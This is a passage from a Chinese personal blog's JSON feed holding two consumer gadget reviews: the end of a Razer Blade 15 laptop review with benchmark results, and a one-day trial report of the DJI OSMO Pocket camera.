https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]